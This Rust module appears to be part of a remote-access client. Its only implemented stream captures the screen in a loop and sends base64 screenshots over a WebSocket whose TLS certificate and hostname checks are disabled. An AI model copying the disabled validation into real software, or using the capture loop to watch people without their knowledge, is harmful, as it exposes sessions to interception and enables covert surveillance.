use tokio_tungstenite::{Connector, WebSocketStream, connect_async_tls_with_config, tungstenite::Message};
use native_tls::{TlsConnector, TlsStream};
use futures::{SinkExt, StreamExt};
use serde::{Deserialize, Serialize};
use url::Url;

use crate::screen;

pub async fn stream_handler(txye:String,session_key: String,url: String){
    match txye.as_str(){
        "remote" => {

        }
        
        "vpn" => {

        }

        "files" => {
            
        }
        "screen" => {
            let _ = screen_stream(session_key, url).await;
        }
        _ => {

        }
    } 
}

pub async fn connect_ws(session_key:String,url:String) -> Option<WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>>{ 
    let url = Url::parse(&url).unwrap();
        let tls_connector = TlsConnector::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap();
    let connector = Connector::NativeTls(tls_connector);
    let stream = connect_async_tls_with_config(url, None,Some(connector))
        .await;

    match stream {
        Ok((mut wsstream,_)) => {
            let _ = wsstream.send(tokio_tungstenite::tungstenite::Message::Text(session_key)).await;
            return Some(wsstream);
        }
        Err(_) => {
            return None;
        },
    }
}


// STREAM PROGRAMMS
pub async fn screen_stream(session_key: String, url: String) -> bool {
    let mut wsstream = match connect_ws(session_key, url).await {
        Some(tuple) => tuple,  
        None => return false,
    };
    loop {
        let base64_screen = screen::takescreen();


        if let Err(e) = wsstream.send(Message::Text(base64_screen)).await {
            println!("Send failed, stream is closed: {:?}", e);
            return false;
        }

        match wsstream.next().await {
            Some(Ok(Message::Close(_))) => {
                println!("Remote closed websocket");
                return false;
            }
            Some(Err(e)) => {
                println!("WebSocket error: {:?}", e);
                return false;
            }
            None => {
                println!("WebSocket dropped");
                return false;
            }
            _ => {}
        }
    }
}


pub async fn progarm_stdin_stdout(session_key: String, url: String) -> bool {
    return true;   
}
